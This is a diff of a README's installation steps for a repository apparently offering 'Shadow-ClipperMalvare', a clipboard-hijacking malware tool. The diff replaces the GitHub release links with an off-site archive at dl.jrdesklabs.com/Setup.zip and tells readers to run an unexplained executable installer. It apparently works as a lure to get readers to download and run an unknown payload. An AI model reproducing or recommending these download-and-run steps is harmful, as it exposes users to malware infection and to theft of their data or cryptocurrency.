@@ -6,9 +6,9 @@
  ### Installation
 
 [![asdasdasd](https://github.com/user-attachments/assets/ccde888d-66c5-4bbb-8f68-29fddbaafdee)
-](https://github.com/GabrielDamiani/Shadow-ClipperMalvare/releases/download/V3.2/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
-## **1. [Download the archive](https://github.com/GabrielDamiani/Shadow-ClipperMalvare/releases/download/V3.2/Release.zip) from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 ![asdgvb](https://github.com/user-attachments/assets/6fd0c00e-1bb5-4411-9d8c-6b27a7eda3e5)
 ![rty](https://github.com/user-attachments/assets/347b09be-096b-4cd1-87de-c4c047371d52)
